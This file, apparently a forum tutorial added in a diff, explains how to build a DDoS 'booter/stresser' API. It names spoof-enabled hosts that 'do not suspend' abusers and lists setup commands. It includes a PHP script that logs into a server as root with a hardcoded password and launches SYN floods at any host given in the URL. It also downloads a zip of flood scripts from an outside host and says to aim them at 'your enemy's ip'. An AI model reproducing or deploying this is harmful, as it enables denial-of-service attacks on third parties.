@@ -1,0 +1,151 @@
+yum install pcap
+yum install libpcap-devel
+yum install libnet
+to spoof
+
+yum install php-pdo
+yum install php-pdo_mysql
+for tnxl security stresser
+
+Make Your Own Booter API
+ 
+Step 1, (Getting the servers)Have you ever owned a booter and wanted a stead flow of power but are constantly letdown by the sad apis on the market today?
+Well I'm going to teach you to make your own api for your booter/stresser.
+ 
+Buying a server:
+There are many providers out there who have spoof enabled such as:
+Ecatel - http://ecatel.info
+Netrouting - http://netrouting.com
+Limehost - http://limehost.ro
+Goweb - http://goweb.de
+ 
+Ecatel is the most known one because they do not suspend.
+You will need to pick a server for your api.
+ 
+ 
+Step 2. (Setting up SSH2)
+You will need to follow the following instructions for setting it up on a dedicated server.
+ 
+Firstly, we’re going to install the php:
+Code:
+yum install php -y
+ 
+Second, we’re going to install the dependencies:
+Code:
+yum install gcc php-devel php-pear libssh2 libssh2-devel
+ 
+These will allow us to build the SSH2 extension using pecl.
+ 
+Code:
+pecl install -f ssh2
+ 
+After running that command, it should stop at a line like:
+ 
+Code:
+..done: 22,740 bytes
+5 source files, building
+running: phpize
+Configuring for:
+PHP Api Version:  20041225
+Zend Module Api No:  20060613
+Zend Extension Api No:   220060519
+libssh2 prefix? [autodetect] :
+ 
+All you have to do is hit Enter and it should detect the proper path. Once the install is completed, you just have to tell PHP to load the extension when it boots.
+ 
+Code:
+touch /etc/php.d/ssh2.ini
+ 
+Code:
+echo extension=ssh2.so > /etc/php.d/ssh2.ini
+ 
+Now restart your webserver and test to see if the changes took effect.
+ 
+Code:
+/etc/init.d/httpd restart
+ 
+To check if you have installed ssh2 correctly type:
+ 
+Code:
+php -m | grep ssh2
+ 
+You should get a line returned with ‘ssh2′.
+ 
+ 
+Step 3 (Uploading Attack Scripts and API)
+ 
+First you want to upload your php script to the following directory
+ 
+Code:
+cd /var/www/html
+ 
+Code:
+nano api.php
+ 
+Second you will need to copy the following code below then past it by right clicking in cmd.
+ 
+Code:
+<?php
+set_time_limit(0);
+ignore_user_abort(true);
+ 
+if (!function_exists("ssh2_connect")) die("function ssh2_connect doesn't exist");
+// log in at server1.example.com on port 22
+if(!($con = ssh2_connect("155.133.24.116", 22))){
+    echo "fail: unable to establish connection\n";
+} else {
+    // try to authenticate with username root, password secretpassword
+    if(!ssh2_auth_password($con, "root", "Pochi1234")) {
+  echo "fail: unable to authenticate\n";
+    } else {
+ 
+  // execute a command
+  if (!($stream = ssh2_exec($con, "/root/ssyn ".$_GET['host']." ".$_GET['port']." ".$_GET['time']))) {
+    echo "fail: unable to execute command\n";
+  } else {
+echo "" . stream_get_contents($stream);
+ 
+    echo "attack sent.";
+    }
+    }
+}
+?>
+ 
+After pasting the code you will need to edit the script by replacing the ip with yours the username with yours and the password with yours.
+ 
+Once you have edited the script and replaced the following listed above you will then press ctrl+x and save it.
+ 
+After saving it you will need to download the attack scripts to your root folder.
+ 
+Code:
+cd /root
+Then:
+Code:
+wget http://dl.dropbox.com/u/64563206/scripts.zip
+Then:
+Code:
+unzip scripts.zip
+Then:
+Code:
+chmod +x rudy slow ssyn udplag 50x arme ghp list.txt proxies.txt
+Then:
+Code:
+./ssyn 109.210.235.256 80 10 o
+ 
+ 
+Step 4 (Final Step)
+ 
+Time to test her out:
+Type in Browser:
+Code:
+http://Youripaddress/api.php?host=1.1.1.1&port=80&time=100
+Replace the 1.1.1.1 with you enemy's ip.
+Replace Youripaddress with your server ip.
+ 
+ 
+ 
+Thats all. If I have made any errors please contact me so I can fix them. If you need help feel free to pm me for assistance.
+ 
+Thank You,
+ 
+ViRaLL
